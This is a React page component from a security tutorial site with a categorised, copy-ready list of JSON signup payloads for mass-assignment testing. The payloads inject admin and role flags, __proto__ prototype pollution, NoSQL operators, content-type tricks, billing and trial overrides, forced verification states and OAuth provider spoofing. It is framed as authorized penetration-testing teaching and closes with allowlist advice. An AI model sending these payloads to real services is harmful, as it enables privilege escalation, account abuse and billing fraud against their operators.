"use client"

import Link from "next/link"
import { MainSidebar } from "@/components/main-sidebar"
import { PageTitle } from "@/components/page-title"
import { Code, ChevronRight, Home, Shield, FileText, Database, Bug, Layers, Key, Terminal, Box, Hash, Settings, Lock, Users, GitBranch, Globe, Zap, ToggleLeft } from "lucide-react"
import { cn } from "@/lib/utils"
import { useState } from "react"

const sections = [
  { id: "intro", label: "Overview" },
  { id: "baseline", label: "Baseline" },
  { id: "boolean-admin", label: "Boolean / Admin" },
  { id: "role-strings", label: "Role / Privilege" },
  { id: "organization", label: "Organization" },
  { id: "nested-prototype", label: "Nested / Prototype" },
  { id: "dot-notation", label: "Deep / Dot-Notation" },
  { id: "type-confusion", label: "Type Confusion" },
  { id: "array-tampering", label: "Arrays" },
  { id: "nosql", label: "NoSQL Operators" },
  { id: "aliases", label: "Aliases" },
  { id: "verification", label: "Verification" },
  { id: "metadata", label: "Metadata" },
  { id: "encoding", label: "Encoding Tricks" },
  { id: "string-encoded", label: "String-Encoded" },
  { id: "large-fields", label: "Large Fields" },
  { id: "billing", label: "Billing Bypass" },
  { id: "state-jumping", label: "Workflow State" },
  { id: "oauth-spoof", label: "OAuth Spoof" },
  { id: "combination", label: "Combination" },
  { id: "conclusion", label: "Conclusion" },
]

function CodeBlock({ request }: { request: string }) {
  return (
    <div className="rounded-lg border border-border bg-card overflow-hidden">
      <div className="bg-muted/50 px-4 py-1.5 text-xs text-muted-foreground font-mono border-b border-border">
        POST /api/v1/register
      </div>
      <pre className="overflow-x-auto p-4 text-sm text-foreground font-mono leading-relaxed"><code>{request}</code></pre>
    </div>
  )
}

function SectionCard({ children, index }: { children: React.ReactNode; index: number }) {
  return (
    <div className="space-y-3">
      {children}
    </div>
  )
}

export default function JSONPrivilegeEscalationPage() {
  const [activeSection, setActiveSection] = useState("intro")

  const scrollToSection = (id: string) => {
    setActiveSection(id)
    const element = document.getElementById(id)
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" })
    }
  }

  return (
    <div className="min-h-screen bg-background">
      <PageTitle title="JSON Privilege Escalation" />
      <MainSidebar />

      <main id="main-content" className="lg:pl-64">
        {/* Breadcrumb */}
        <div className="border-b border-border bg-card/50">
          <div className="mx-auto max-w-5xl px-6 py-3">
            <nav className="flex items-center gap-2 text-sm text-muted-foreground">
              <Link href="/" className="flex items-center gap-1 hover:text-foreground">
                <Home className="h-4 w-4" />
              </Link>
              <ChevronRight className="h-4 w-4" />
              <Link href="/vulnerabilities" className="hover:text-foreground">Web Vulnerabilities</Link>
              <ChevronRight className="h-4 w-4" />
              <span className="text-foreground">JSON Privilege Escalation</span>
            </nav>
          </div>
        </div>

        {/* Hero */}
        <div className="relative overflow-hidden border-b border-border bg-gradient-to-br from-primary/10 via-background to-accent/5">
          <div className="relative px-6 py-12 text-center lg:py-16">
            <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-2xl bg-primary/10 text-primary">
              <Shield className="h-8 w-8" />
            </div>
            <h1 className="text-3xl font-bold text-foreground lg:text-4xl text-balance">
              JSON Privilege Escalation
            </h1>
            <p className="mx-auto mt-3 max-w-2xl text-muted-foreground text-pretty">
              Uncovering Invisible Privileges: The Ultimate Guide to Mass-Assignment in Registration Flows
            </p>
            <p className="mx-auto mt-2 max-w-2xl text-sm text-muted-foreground">
              A practical walkthrough of how hidden JSON fields can expose privilege flaws in modern signup APIs
            </p>
            <div className="mt-6 flex flex-wrap items-center justify-center gap-3">
              <span className="rounded-full bg-primary/10 px-4 py-2 text-sm font-medium text-primary">20+ Categories</span>
              <span className="rounded-full bg-accent/10 px-4 py-2 text-sm font-medium text-accent">40+ Payloads</span>
              <span className="rounded-full bg-secondary px-4 py-2 text-sm font-medium text-foreground">Copy Ready</span>
            </div>
            <div className="mt-4 text-center text-sm">
              <span className="text-muted-foreground">Source: </span>
              <a href="https://x.com/lostsec_" target="_blank" rel="noopener noreferrer"
                className="inline-flex items-center gap-1 font-medium text-primary hover:text-primary/80 transition-colors">
                @lostsec_
                <svg className="h-3.5 w-3.5" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
                </svg>
              </a>
            </div>
          </div>
        </div>

        {/* Sticky Navigation */}
        <div className="sticky top-0 z-20 border-b border-border bg-card/95 backdrop-blur-sm">
          <div className="mx-auto max-w-5xl px-6">
            <div className="flex gap-1 overflow-x-auto py-3 scrollbar-hide">
              {sections.map((s) => (
                <button
                  key={s.id}
                  onClick={() => scrollToSection(s.id)}
                  className={cn(
                    "flex shrink-0 items-center gap-2 rounded-lg px-3 py-2 text-sm font-medium transition-colors",
                    activeSection === s.id
                      ? "bg-primary text-primary-foreground"
                      : "text-muted-foreground hover:bg-muted hover:text-foreground"
                  )}
                >
                  {s.label}
                </button>
              ))}
            </div>
          </div>
        </div>

        {/* Content */}
        <div className="mx-auto max-w-5xl space-y-12 p-6">

          {/* Intro */}
          <section id="intro" className="scroll-mt-24">
            <h2 className="mb-4 text-2xl font-bold text-foreground">Practical JSON Payload Variants for Mass-Assignment Testing</h2>
            <p className="text-muted-foreground leading-relaxed">
              Below are categorized payload examples you can use directly during testing. Each section includes a short explanation to help you understand what the variation is meant to uncover.
            </p>
          </section>

          {/* Baseline */}
          <section id="baseline" className="scroll-mt-24">
            <div className="mb-4 flex items-center gap-3">
              <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Terminal className="h-4 w-4" />
              </div>
              <h2 className="text-xl font-bold text-foreground">Baseline Payloads</h2>
            </div>
            <p className="mb-4 text-sm text-muted-foreground">
              These are your initial &ldquo;clean&rdquo; requests. They help you confirm how the application handles uniqueness checks, email normalization, plus-addressing and subdomain-based emails. They act as a foundation before you start adding suspicious fields.
            </p>
            <div className="space-y-3">
              <CodeBlock request={`{\n  "username":"probe_user_01",\n  "email":"probe01@example.com",\n  "password":"Password1!"\n}`} />
              <CodeBlock request={`{\n  "username":"tester.jane",\n  "email":"jane.tester+1@example.com",\n  "password":"Password1!"\n}`} />
              <CodeBlock request={`{\n  "username":"alpha_user",\n  "email":"alpha.user@sub.example.com",\n  "password":"Password1!"\n}`} />
              <CodeBlock request={`{\n  "username":"bot_automation",\n  "email":"bot+signup@example.co.uk",\n  "password":"Password1!"\n}`} />
            </div>
          </section>

          {/* Boolean / Admin */}
          <section id="boolean-admin" className="scroll-mt-24">
            <div className="mb-4 flex items-center gap-3">
              <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <ToggleLeft className="h-4 w-4" />
              </div>
              <h2 className="text-xl font-bold text-foreground">Boolean / Admin Flag Attempts</h2>
            </div>
            <p className="mb-4 text-sm text-muted-foreground">
              These payloads test whether the backend accepts privilege-related fields that should never be user-controlled. Changing casing, types or naming helps reveal loose parsing or inconsistent permission handling.
            </p>
            <div className="space-y-3">
              <CodeBlock request={`{\n  "username":"probe_user_01",\n  "email":"probe01@example.com",\n  "isAdmin": true,\n  "password":"Password1!"\n}`} />
              <CodeBlock request={`{\n  "username":"probe_user_01",\n  "email":"probe01@example.com",\n  "admin": "true",\n  "password":"Password1!"\n}`} />
              <CodeBlock request={`{\n  "username":"probe_user_01",\n  "email":"probe01@example.com",\n  "ADMIN": 1,\n  "password":"Password1!"\n}`} />
              <CodeBlock request={`{\n  "username":"probe_user_01",\n  "email":"probe01@example.com",\n  "is_admin": 1,\n  "password":"Password1!"\n}`} />
            </div>
          </section>

          {/* Role / Privilege */}
          <section id="role-strings" className="scroll-mt-24">
            <div className="mb-4 flex items-center gap-3">
              <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Key className="h-4 w-4" />
              </div>
              <h2 className="text-xl font-bold text-foreground">Role, Privilege Strings, and Numeric Flags</h2>
            </div>
            <p className="mb-4 text-sm text-muted-foreground">
              Some systems map roles by name or ID. Supplying role strings or IDs can reveal whether the application exposes privilege configuration through mass-assignment. This is a common escalation vector when internal role logic is loosely enforced.
            </p>
            <div className="space-y-3">
              <CodeBlock request={`{\n  "username":"role_tester",\n  "email":"role.tester@example.com",\n  "role":"admin",\n  "password":"Password1!"\n}`} />
              <CodeBlock request={`{\n  "username":"role_tester",\n  "email":"role.tester@example.com",\n  "role":"superuser",\n  "password":"Password1!"\n}`} />
              <CodeBlock request={`{\n  "username":"role_tester",\n  "email":"role.tester@example.com",\n  "role_id":0,\n  "password":"Password1!"\n}`} />
              <CodeBlock request={`{\n  "username":"role_tester",\n  "email":"role.tester@example.com",\n  "user_priv":"administrator",\n  "password":"Password1!"\n}`} />
            </div>
          </section>

          {/* Organization */}
          <section id="organization" className="scroll-mt-24">
            <div className="mb-4 flex items-center gap-3">
              <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Users className="h-4 w-4" />
              </div>
              <h2 className="text-xl font-bold text-foreground">Organization / Tenant Field Variants</h2>
            </div>
            <p className="mb-4 text-sm text-muted-foreground">
              Multi-tenant applications often rely on IDs, slugs or organization names stored internally. If these fields are accessible during signup, an attacker might join restricted tenants or impersonate internal groups.
            </p>
            <div className="space-y-3">
              <CodeBlock request={`{\n  "username":"org_probe",\n  "email":"org.probe@example.com",\n  "org":"CompanyA",\n  "password":"Password1!"\n}`} />
              <CodeBlock request={`{\n  "username":"org_probe",\n  "email":"org.probe@example.com",\n  "organization_id":1,\n  "password":"Password1!"\n}`} />
              <CodeBlock request={`{\n  "username":"org_probe",\n  "email":"org.probe@example.com",\n  "org_slug":"internal-team",\n  "password":"Password1!"\n}`} />
            </div>
          </section>

          {/* Nested / Prototype */}
          <section id="nested-prototype" className="scroll-mt-24">
            <div className="mb-4 flex items-center gap-3">
              <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Layers className="h-4 w-4" />
              </div>
              <h2 className="text-xl font-bold text-foreground">Nested Objects and Prototype-Style Payloads</h2>
            </div>
            <p className="mb-4 text-sm text-muted-foreground">
              JSON-backed systems often merge nested objects into existing models. This can accidentally expose internal fields. Prototype pollution attempts such as <code className="rounded bg-muted px-1 py-0.5 text-xs">__proto__</code> can affect JavaScript backends that don&apos;t sanitize keys properly.
            </p>
            <div className="space-y-3">
              <CodeBlock request={`{\n  "username":"nested_user",\n  "email":"nested.user@example.com",\n  "password":"Password1!",\n  "profile": {\n    "bio":"testing",\n    "visibility":"private"\n  }\n}`} />
              <CodeBlock request={`{\n  "username":"proto_user",\n  "email":"proto.user@example.com",\n  "password":"Password1!",\n  "__proto__": {"isAdmin": true}\n}`} />
            </div>
          </section>

          {/* Deep / Dot-Notation */}
          <section id="dot-notation" className="scroll-mt-24">
            <div className="mb-4 flex items-center gap-3">
              <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <GitBranch className="h-4 w-4" />
              </div>
              <h2 className="text-xl font-bold text-foreground">Deeply Nested and Dot-Notation Keys</h2>
            </div>
            <p className="mb-4 text-sm text-muted-foreground">
              Some systems interpret dotted keys as nested objects. Others flatten nested objects into dot notation. These mismatches can unintentionally overwrite sensitive internal fields.
            </p>
            <div className="space-y-3">
              <CodeBlock request={`{\n  "username":"deep_user",\n  "email":"deep.user@example.com",\n  "password":"Password1!",\n  "account": {\n    "meta": {\n      "role":"admin"\n    }\n  }\n}`} />
              <CodeBlock request={`{\n  "username":"deep_user",\n  "email":"deep.user@example.com",\n  "password":"Password1!",\n  "account.role":"admin"\n}`} />
            </div>
          </section>

          {/* Type Confusion */}
          <section id="type-confusion" className="scroll-mt-24">
            <div className="mb-4 flex items-center gap-3">
              <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Hash className="h-4 w-4" />
              </div>
              <h2 className="text-xl font-bold text-foreground">Type Confusion and Mismatched Data Types</h2>
            </div>
            <p className="mb-4 text-sm text-muted-foreground">
              Different backends handle Boolean and null values differently. In some systems, &ldquo;false&rdquo; or 0 can still evaluate as truthy or trigger unexpected logic when coerced.
            </p>
            <div className="space-y-3">
              <CodeBlock request={`{\n  "username":"type_user",\n  "email":"type.user@example.com",\n  "password":"Password1!",\n  "admin": "false"\n}`} />
              <CodeBlock request={`{\n  "username":"type_user",\n  "email":"type.user@example.com",\n  "password":"Password1!",\n  "admin": 0\n}`} />
              <CodeBlock request={`{\n  "username":"type_user",\n  "email":"type.user@example.com",\n  "password":"Password1!",\n  "admin": null\n}`} />
            </div>
          </section>

          {/* Arrays */}
          <section id="array-tampering" className="scroll-mt-24">
            <div className="mb-4 flex items-center gap-3">
              <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Box className="h-4 w-4" />
              </div>
              <h2 className="text-xl font-bold text-foreground">Arrays and List-Based Tampering</h2>
            </div>
            <p className="mb-4 text-sm text-muted-foreground">
              Some frameworks convert arrays into strings or only use the first element. This can expose unexpected parsing behavior or override fields using array-based privilege escalation.
            </p>
            <div className="space-y-3">
              <CodeBlock request={`{\n  "username":["array_user"],\n  "email":["array.user@example.com"],\n  "password":["Password1!"]\n}`} />
              <CodeBlock request={`{\n  "username":"array_user",\n  "email":"array.user@example.com",\n  "password":"Password1!",\n  "roles":["user","admin"]\n}`} />
            </div>
          </section>

          {/* NoSQL */}
          <section id="nosql" className="scroll-mt-24">
            <div className="mb-4 flex items-center gap-3">
              <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Database className="h-4 w-4" />
              </div>
              <h2 className="text-xl font-bold text-foreground">MongoDB / NoSQL Operator Payloads</h2>
            </div>
            <p className="mb-4 text-sm text-muted-foreground">
              If a server unintentionally passes JSON directly into a NoSQL query, operators like <code className="rounded bg-muted px-1 py-0.5 text-xs">$ne</code> or <code className="rounded bg-muted px-1 py-0.5 text-xs">$gt</code> can break filtering or bypass validation. This type of test must only be done in authorized environments.
            </p>
            <div className="space-y-3">
              <CodeBlock request={`{\n  "username":"mongo_user",\n  "email":"mongo.user@example.com",\n  "password":"Password1!",\n  "isAdmin": {"$ne": null}\n}`} />
              <CodeBlock request={`{\n  "username":{"$gt": ""},\n  "email":"injection@example.com",\n  "password":"Password1!"\n}`} />
            </div>
          </section>

          {/* Aliases */}
          <section id="aliases" className="scroll-mt-24">
            <div className="mb-4 flex items-center gap-3">
              <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <FileText className="h-4 w-4" />
              </div>
              <h2 className="text-xl font-bold text-foreground">Parameter Aliases, Synonyms, and Name Variants</h2>
            </div>
            <p className="mb-4 text-sm text-muted-foreground">
              Some systems accept multiple aliases for admin-related fields. Sending variations helps identify whether the backend uses loose key matching or legacy field mappings.
            </p>
            <div className="space-y-3">
              <CodeBlock request={`{\n  "username":"alias_user",\n  "email":"alias.user@example.com",\n  "password":"Password1!",\n  "is_superuser": true\n}`} />
              <CodeBlock request={`{\n  "username":"alias_user",\n  "email":"alias.user@example.com",\n  "password":"Password1!",\n  "super_user": true\n}`} />
              <CodeBlock request={`{\n  "username":"alias_user",\n  "email":"alias.user@example.com",\n  "password":"Password1!",\n  "staff": true\n}`} />
            </div>
          </section>

          {/* Verification */}
          <section id="verification" className="scroll-mt-24">
            <div className="mb-4 flex items-center gap-3">
              <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Lock className="h-4 w-4" />
              </div>
              <h2 className="text-xl font-bold text-foreground">Verification and Timestamp Manipulation</h2>
            </div>
            <p className="mb-4 text-sm text-muted-foreground">
              Some APIs store verification flags directly from the request. Attackers may exploit these fields to mark their own email as verified or disable expiry validation.
            </p>
            <div className="space-y-3">
              <CodeBlock request={`{\n  "username":"verify_user",\n  "email":"verify.user@example.com",\n  "password":"Password1!",\n  "email_verified": true\n}`} />
              <CodeBlock request={`{\n  "username":"verify_user",\n  "email":"verify.user@example.com",\n  "password":"Password1!",\n  "verification_expires":"1970-01-01T00:00:00Z"\n}`} />
            </div>
          </section>

          {/* Metadata */}
          <section id="metadata" className="scroll-mt-24">
            <div className="mb-4 flex items-center gap-3">
              <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Settings className="h-4 w-4" />
              </div>
              <h2 className="text-xl font-bold text-foreground">Metadata and Opaque JSON Fields</h2>
            </div>
            <p className="mb-4 text-sm text-muted-foreground">
              Many systems allow metadata fields for logging or tracking purposes. If not properly filtered, attackers can overwrite internal metadata or inject privilege hints.
            </p>
            <div className="space-y-3">
              <CodeBlock request={`{\n  "username":"meta_user",\n  "email":"meta.user@example.com",\n  "password":"Password1!",\n  "metadata": {\n    "internal_role":"admin",\n    "created_by":"script"\n  }\n}`} />
            </div>
          </section>

          {/* Encoding */}
          <section id="encoding" className="scroll-mt-24">
            <div className="mb-4 flex items-center gap-3">
              <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Globe className="h-4 w-4" />
              </div>
              <h2 className="text-xl font-bold text-foreground">Encoding and Content-Type Tricks</h2>
            </div>
            <p className="mb-4 text-sm text-muted-foreground">
              Some APIs trust the Content-Type header too much. If the backend has fallback parsers, sending the same JSON with a different or misleading content type can trigger unexpected parsing logic. That can open the door to weaker validation or alternate code paths the developers didn&apos;t intend to expose.
            </p>
            <div className="space-y-3">
              <div className="rounded-lg border border-border bg-card overflow-hidden">
                <div className="bg-muted/50 px-4 py-1.5 text-xs text-muted-foreground font-mono border-b border-border">
                  POST /api/v1/register<br />
                  Content-Type: text/plain
                </div>
                <pre className="overflow-x-auto p-4 text-sm text-foreground font-mono leading-relaxed"><code>{`{\n  "username": "ct_user",\n  "email": "ct.user@example.com",\n  "password": "Password1!",\n  "isAdmin": true\n}`}</code></pre>
              </div>
            </div>
            <p className="mt-4 text-sm text-muted-foreground">
              Even though the header says text/plain, some frameworks still try to parse it as JSON. If the validation for &ldquo;non-JSON&rdquo; requests is weaker, attackers can slip in fields like isAdmin without being filtered. You can also try:
            </p>
            <div className="mt-2 flex flex-wrap gap-2">
              {["application/x-www-form-urlencoded", "application/xml", "*/*", "application/json; charset=garbage", "application/json; boundary=--", "application/json; x=1"].map((ct) => (
                <span key={ct} className="rounded-md bg-muted px-2 py-1 text-xs text-muted-foreground font-mono">{ct}</span>
              ))}
            </div>
          </section>

          {/* String-Encoded */}
          <section id="string-encoded" className="scroll-mt-24">
            <div className="mb-4 flex items-center gap-3">
              <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Code className="h-4 w-4" />
              </div>
              <h2 className="text-xl font-bold text-foreground">String-Encoded JSON Fields</h2>
            </div>
            <p className="mb-4 text-sm text-muted-foreground">
              Some APIs try to parse strings that look like JSON. This is a common oversight when fields are stored in schemaless or flexible models.
            </p>
            <div className="space-y-3">
              <CodeBlock request={`{\n  "username":"string_json",\n  "email":"string.json@example.com",\n  "password":"Password1!",\n  "profile":"{\\"isAdmin\\":true}"\n}`} />
            </div>
          </section>

          {/* Large Fields */}
          <section id="large-fields" className="scroll-mt-24">
            <div className="mb-4 flex items-center gap-3">
              <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <FileText className="h-4 w-4" />
              </div>
              <h2 className="text-xl font-bold text-foreground">Large / Repeated Fields</h2>
            </div>
            <p className="mb-4 text-sm text-muted-foreground">
              Oversized payloads help identify length limits, truncation or failure modes in the signup flow. They&apos;re also useful for discovering unexpected storage behavior.
            </p>
            <div className="space-y-3">
              <CodeBlock request={`{\n  "username":"long_user",\n  "email":"long.user@example.com",\n  "password":"Password1!",\n  "bio":"AAAAAA... (very long string)"\n}`} />
            </div>
          </section>

          {/* Billing Bypass */}
          <section id="billing" className="scroll-mt-24">
            <div className="mb-4 flex items-center gap-3">
              <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Zap className="h-4 w-4" />
              </div>
              <h2 className="text-xl font-bold text-foreground">Subscription &amp; Billing Bypass</h2>
            </div>
            <p className="mb-4 text-sm text-muted-foreground">
              This is often overlooked. In SaaS applications, user models frequently store subscription data. If you can manipulate these fields during signup, you might trick the system into giving you a &ldquo;Pro&rdquo; or &ldquo;Enterprise&rdquo; account without paying anything.
            </p>
            <div className="space-y-3">
              <CodeBlock request={`{\n  "username": "freeloader",\n  "email": "free@example.com",\n  "plan": "pro",\n  "password": "Password1!"\n}`} />
              <CodeBlock request={`{\n  "username": "freeloader",\n  "email": "free@example.com",\n  "subscription_id": 9999,\n  "password": "Password1!"\n}`} />
              <CodeBlock request={`{\n  "username": "freeloader",\n  "email": "free@example.com",\n  "is_premium": true,\n  "password": "Password1!"\n}`} />
              <CodeBlock request={`{\n  "username": "freeloader",\n  "email": "free@example.com",\n  "trial_ends_at": "2050-01-01T00:00:00Z",\n  "password": "Password1!"\n}`} />
            </div>
          </section>

          {/* Workflow State */}
          <section id="state-jumping" className="scroll-mt-24">
            <div className="mb-4 flex items-center gap-3">
              <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <GitBranch className="h-4 w-4" />
              </div>
              <h2 className="text-xl font-bold text-foreground">Workflow State Jumping</h2>
            </div>
            <p className="mb-4 text-sm text-muted-foreground">
              User accounts often go through &ldquo;states&rdquo; — e.g., pending, active, suspended, or banned. If the backend logic relies on the user model to track this state, you can try to force your account directly into an &ldquo;active&rdquo; state, bypassing email verification or approval queues.
            </p>
            <div className="space-y-3">
              <CodeBlock request={`{\n  "username": "status_jumper",\n  "email": "jump@example.com",\n  "status": "active",\n  "password": "Password1!"\n}`} />
              <CodeBlock request={`{\n  "username": "status_jumper",\n  "email": "jump@example.com",\n  "state": "verified",\n  "password": "Password1!"\n}`} />
              <CodeBlock request={`{\n  "username": "status_jumper",\n  "email": "jump@example.com",\n  "email_verified": true,\n  "password": "Password1!"\n}`} />
            </div>
          </section>

          {/* OAuth Spoof */}
          <section id="oauth-spoof" className="scroll-mt-24">
            <div className="mb-4 flex items-center gap-3">
              <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Users className="h-4 w-4" />
              </div>
              <h2 className="text-xl font-bold text-foreground">OAuth &amp; Provider Spoofing</h2>
            </div>
            <p className="mb-4 text-sm text-muted-foreground">
              If the application supports &ldquo;Sign in with Google/Facebook,&rdquo; the user model likely stores a provider ID. If you register via the normal form but inject OAuth fields, you might trick the system into linking your password-based account to a legitimate admin&apos;s social identity (if the validation logic is flawed).
            </p>
            <div className="space-y-3">
              <CodeBlock request={`{\n  "username": "oauth_spoof",\n  "email": "spoof@example.com",\n  "provider": "google",\n  "provider_id": "100234234234...",\n  "password": "Password1!"\n}`} />
              <CodeBlock request={`{\n  "username": "oauth_spoof",\n  "email": "spoof@example.com",\n  "auth_strategy": "ldap",\n  "password": "Password1!"\n}`} />
            </div>
          </section>

          {/* Combination */}
          <section id="combination" className="scroll-mt-24">
            <div className="mb-4 flex items-center gap-3">
              <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Bug className="h-4 w-4" />
              </div>
              <h2 className="text-xl font-bold text-foreground">Combination Payload (High-Value Finding)</h2>
            </div>
            <p className="mb-4 text-sm text-muted-foreground">
              Mixing multiple techniques is one of the most effective ways to find real vulnerabilities. Some combinations bypass incomplete validation or trigger multiple deserialization paths at once.
            </p>
            <div className="space-y-3">
              <CodeBlock request={`{\n  "username":"combo_user",\n  "email":"combo.user+test@example.com",\n  "password":"Password1!",\n  "__proto__": {"isAdmin": true},\n  "profile": {"role":"admin"},\n  "metadata": "{\\"elevate\\":true}"\n}`} />
            </div>
          </section>

          {/* Conclusion */}
          <section id="conclusion" className="scroll-mt-24">
            <div className="rounded-xl border border-primary/20 bg-gradient-to-br from-primary/5 via-background to-accent/5 p-8">
              <h2 className="mb-4 text-2xl font-bold text-foreground text-center">Conclusion</h2>
              <p className="text-center text-muted-foreground leading-relaxed max-w-3xl mx-auto">
                Mass-assignment bugs occur when backends trust incoming JSON too much. A harmless-looking signup request can overwrite sensitive fields if filtering isn&apos;t strict. Testing the payload variations above helps reveal how the API handles different structures and types. Once these gaps are found, enforcing allowlists and validating each field becomes straightforward. Securing the signup flow strengthens the entire application.
              </p>
            </div>
          </section>

          {/* Footer */}
          <footer className="border-t border-border pt-8 text-center">
            <p className="text-sm text-muted-foreground">
              This guide is for ethical use and authorized penetration testing only
            </p>
          </footer>

        </div>
      </main>
    </div>
  )
}
